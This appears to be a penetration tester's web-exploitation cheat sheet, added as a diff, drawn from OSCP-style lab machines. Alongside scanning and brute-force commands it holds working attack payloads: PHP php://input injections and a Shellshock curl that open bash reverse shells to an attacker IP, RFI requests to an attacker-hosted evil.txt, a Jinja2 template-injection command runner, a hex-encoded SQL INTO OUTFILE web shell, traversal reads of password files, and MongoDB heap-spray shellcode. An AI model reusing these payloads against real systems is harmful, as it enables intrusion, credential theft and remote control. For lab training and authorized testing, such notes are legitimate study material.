@@ -1,0 +1,250 @@
+# Enumeration
+1) View the webpage
+	look at source
+	look for version
+	look for usernames
+	look for place to upload file
+2) Run scans
+	dirb
+	nikto
+	gobuster
+	wpscan (if applicable)
+3) Look for vulnerablities
+	CMS
+	plugins
+	themes
+	js modules
+	check the query string.  If there is a "file" or "page" parameters, test for directory traversal
+4) Brute force
+	look up default creds
+	if lots of custom text, run cewl
+5) Last resort
+	Vulnerable header manipulation (see below)
+	XSS
+	Client side exploits
+	ffuf
+
+# curl 
+# include headers
+curl -i 10.11.1.71
+
+# Scan
+# recursive directory scan
+dirb http://10.11.1.5		# /usr/share/seclists for additional word lists
+# scan for file types
+dirb http://10.3.3.34 -X .php
+# scan for certain response codes
+gobuster -u http://10.11.1.71 -w /usr/share/seclists/Discovery/Web_Content/CGIs.txt -s '200,204,403,500' -e
+# better directory scan (Non recursive)
+gobuster dir -t 100 -q -z -o gobuster.txt -x php,txt,jsp,cgi,htm,html,zip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.11.1.123
+# gobuster through proxy
+sudo gobuster dir -t 100 -k -q -z -o gobuster.txt -x php,txt,jsp,cgi --proxy socks5://127.0.0.1:11111 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.1.1.27
+# scan for virtual host names
+gobuster vhost -w /usr/share/dirb/wordlists/big.txt -u gitroot.vuln | grep 200
+# webserver scanner
+nikto -host http://10.11.1.71
+# robots.txt parser
+parsero -u 10.11.1.222:8080
+# pull wordlist from website
+cewl --with-numbers http://<ip>
+# fast web fuzer
+# 192.168.X.212 EvilBox-One
+~/OSCP-labs/notes/http/ffuf -u 'http://192.168.149.212/secret/evil.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 0
+# big dictionary
+gobuster dir -t 100 -q -z -o gobuster.txt -x php,txt,jsp,cgi -w /usr/share/wordlists/dirb/big.txt -u http://<ip>
+
+# brute force embedded login prompt
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f 192.168.83.81 http-get /zmail
+
+# cross site scripting example exploit
+<script>alert('XSS')</script>
+
+# Check for vulnerable header manipulation.  Append using burp
+Host: <ip>
+X-Forwarded-For: localhost
+
+
+#SSL
+*Check system_default_sect on /etc/ssl/openssl.cnf for supported protocols*
+echo -n | openssl s_client -connect 10.11.1.123:443
+
+# Wordpress:		# Note, run each of these scans separately.  Running all at once may give bad results
+https://www.cyberpunk.rs/wpscan-usage-example
+# database credentials stored in wp-config.php
+# /wp-content/ to view plugins, themes, and uploads
+wpscan --url http://<ip>
+wpscan --url http://<ip> --enumerate u
+wpscan --url http://<ip> --enumerate ap
+wpscan --url http://<ip> --enumerate at
+wpscan --url http://<ip> --passwords /usr/share/wordlists/rockyou.txt --usernames admin,core,backup
+# 192.168.X.217 Blogger
+wpscan --url http://blogger.thm/assets/fonts/blog/ --plugins-detection aggressive
+
+# Cold Fusion
+# webshell
+/usr/share/webshells/cfm/cfexec.cfm
+msfvenom: java/jsp_shell_reverse_tcp
+
+# LFI
+https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/
+https://book.hacktricks.xyz/pentesting-web/file-inclusion
+https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html
+https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/
+
+# LFI wrappers
+https://book.hacktricks.xyz/pentesting-web/file-inclusion#wrapper-input
+https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/
+# 10.11.1.35 PAIN
+curl -X POST -d "<?php system('id'); ?>" http://10.11.1.35/section.php?page=php://input
+curl -X POST -d "<?php shell_exec(\"bash -i >& /dev/tcp/192.168.119.138/4445 0>&1\");?> " http://10.11.1.35/section.php?page=php://input
+
+# RFI
+# Only vulnerable to RFI if the PHP configuration contains "allow_url_open" and "allow_url_include"
+# If the rfi tries to make a request with addional characters at the end, use %00 to terminate URL.
+
+
+# IIS
+# IIS looks picky when it comes to shells.  Try asp, aspx and try x86 and x64
+# 10.11.1.13 DISCO
+
+# robots.txt
+http://forums.mozillazine.org/viewtopic.php?p=4378245
+https://keycdn.com/blog/web-crawlers
+# 10.11.1.39 LEFTTURN.THINC
+curl -L -A "Googlebot" http://10.11.1.39/robots.txtUser-agent: *
+
+# javascript
+https://www.prettifyjs.net/
+
+# webmin
+# The version information will be on the first line of the nikto results.
+# 10.11.1.141 FC4
+nikto -host http://10.11.1.141:10000
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.11.1.141
++ Target Hostname:    10.11.1.141
++ Target Port:        10000
++ Start Time:         2022-07-14 16:58:32 (GMT-4)
+---------------------------------------------------------------------------
++ Server: MiniServ/0.01
+# Config file is located at /etc/webmin/miniserv.conf
+# Check the config file to see if any file types are blocked
+denyfile=\.pl$
+
+# apache tomcat
+# 10.11.1.209 KRAKEN
+# default creds
+https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
+# deploy reverse shell war file
+https://null-byte.wonderhowto.com/how-to/hack-apache-tomcat-via-malicious-war-file-upload-0202593/
+
+# Server side template injection (SSTI)
+https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
+# Example, depending on the IP that accesses a site, the site may look like:
+<h1>Welcome to the page!</h1>
+<u>This page is being accessed from the remote address: {{ip}}</u>
+https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti
+https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
+# 192.168.X.102 Djinn3
+# check for vulnerablility: {{7*'7'}} should resolve to 7777777 or 49
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+
+# Exploits
+# Cold Fusion
+# CFv8 is vulnerable to directory traversal
+# MIKE 10.11.1.10
+http://10.11.1.10/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+# CFv8 (and possible others) can upload a shell with the scheduled task function
+https://www.cfguide.io/coldfusion-administrator/server-settings-scheduled-tasks/
+
+# Cuppa CMS
+# 10.11.1.116 DOTTY
+# default creds are admin/admin
+# Cuppa CMS is vulnerable to LFI/RFI https://www.exploit-db.com/exploits/25971
+
+# phplightadmin
+# 10.11.1.116 DOTTY
+# v1.9.3 default password is admin
+# v1.9.3 is vulnerable to RCE https://www.exploit-db.com/exploits/24044
+
+# SiTeFiLo (Simple Text-File Login script)
+# 10.11.1.133 GH0ST
+# version 1.0.6 is vulnerable to RFI
+
+# Secure Server Web Interface
+# 10.11.1.35 PAIN
+The section.php file is vulnerable to RFI
+curl http://10.11.1.35/section.php?page=http://192.168.119.138/evil.txt
+
+# OTRS
+# version 5 is vulnerable to https://www.exploit-db.com/exploits/43853
+# 10.11.1.39 LEFTTURN.THINC
+# default creds root@localhost/otrs
+
+# web2py
+# version 2.14.5 is vulnerable to https://www.exploit-db.com/exploits/39821.  Specifically LFI
+# 10.11.1.44 314159265
+https://10.11.1.44:8000/admin/pack_custom/Issue_Tracker
+Change to "file=/etc/passwd" in burp
+
+# httpfileserver (HFS)
+# version 2.3.x is vulnerable to https://www.exploit-db.com/exploits/49584
+# 10.11.1.50 BETHANY
+# change ip and port in exploit
+python3 49584.py
+
+# BigTree CMS
+# 10.11.1.71 ALPHA
+# This version was vulnerable to shell shock (found in nikto output)
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.119.130/55555 0>&1' http://10.11.1.71/cgi-bin/admin.cgi 2>/dev/null
+
+# Shellshock
+# 10.11.1.71 ALPHA
+https://book.hacktricks.xyz/pentesting/pentesting-web/cgi
+https://www.exploit-db.com/exploits/34900
+
+# Webmin/minserv
+# minserv version 0.01 is vulnerable to https://www.exploit-db.com/exploits/2017
+# 10.11.1.141 FC4
+perl 2017.pl 10.11.1.141 10000 /etc/shadow 0
+
+# Ovidentia
+# version 6 is vulnerable to https://www.exploit-db.com/exploits/49707
+http://10.11.1.73:8080/php/index.php?tg=delegat&idx=mem&id=1 UNION ALL SELECT 0x3c3f706870206563686f20223c7072653e223b6563686f207368656c6c5f6578656328245f524551554553545b2263225d293b6563686f20223c2f7072653e223b3f3e,2 INTO OUTFILE 'C:\\wamp\\www\\juju2.php'--
+
+# Advanced comment system (acs)
+# ACS is vulnerable to https://www.exploit-db.com/exploits/49343 and https://www.exploit-db.com/exploits/9623
+# 10.11.1.8 PHEONIX
+curl http://10.11.1.8/internal/advanced_comment_system/index.php?ACS_path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00
+$ curl http://10.11.1.8/internal/advanced_comment_system/index.php?ACS_path=http://192.168.119.237/evil.txt
+
+# Elastix
+# version 2.2.0 is vulnerabfle to https://www.exploit-db.com/exploits/18650
+# 10.11.1.217 HOTLINE
+python 18650.py
+# default creds can be found at https://www.3cx.com/community/threads/default-passwords-not-password.90259/
+
+# ApPHP MicroBlog
+# version 1.0.2 is vulnerable to https://www.exploit-db.com/exploits/33070
+# 10.11.1.223 JEFF
+python 33070.py http://10.11.1.223
+
+# Bookstorecms
+# vulnerable to https://www.google.com/search?client=firefox-b-1-e&q=bookstorecms+exploit
+# 192.168.X.111 FunboxEasy
+python 47887.py http://192.168.203.111/store/
+
+# Mongodb
+# version 2.2.3 is vulnerable to https://www.exploit-db.com/exploits/24947
+# 10.11.1.237 HUMBLE
+';shellcode=unescape("%udb31%ue3f7%u4353%u6a53%u8902%ub0e1%ucd66%u9380%ub059%ucd3f%u4980%uf979%uc068%u77a8%u68d0%u0002%u5c11%ue189%u66b0%u5150%ub353%u8903%ucde1%u5280%u6e68%u732f%u6868%u2f2f%u6962%ue389%u5352%ue189%u0bb0%u80cd"); sizechunk=0x1000; chunk=""; for(i=0;i<sizechunk;i++){ chunk+=unescape("%u9090%u9090"); } chunk=chunk.substring(0,(sizechunk-shellcode.length)); testarray=new Array(); for(i=0;i<25000;i++){ testarray[i]=chunk+shellcode; } ropchain=unescape("%uf768%u0816%u0c0c%u0c0c%u0000%u0c0c%u1000%u0000%u0007%u0000%u0031%u0000%uffff%uffff%u0000%u0000"); sizechunk2=0x1000; chunk2=""; for(i=0;i<sizechunk2;i++){ chunk2+=unescape("%u5a70%u0805"); } chunk2=chunk2.substring(0,(sizechunk2-ropchain.length)); testarray2=new Array(); for(i=0;i<25000;i++){ testarray2[i]=chunk2+ropchain; } nativeHelper.apply({"x" : 0x836e204}, ["A"+"\x26\x18\x35\x08"+"MongoSploit!"+"\x58\x71\x45\x08"+"sthack is a nice place to be"+"\x6c\x5a\x05\x08"+"\x20\x20\x20\x20"+"\x58\x71\x45\x08"]);'})
+
+# mantisbt
+# Version 1.3-2.3 are vulnerable to https://www.exploit-db.com/exploits/48818
+$ python 48818.py 
+Successfully hijacked account!
+Successfully logged in!
+Triggering reverse shell
+# Database creds are stored in "/var/www/html/mantisbt/config/config_inc.php"
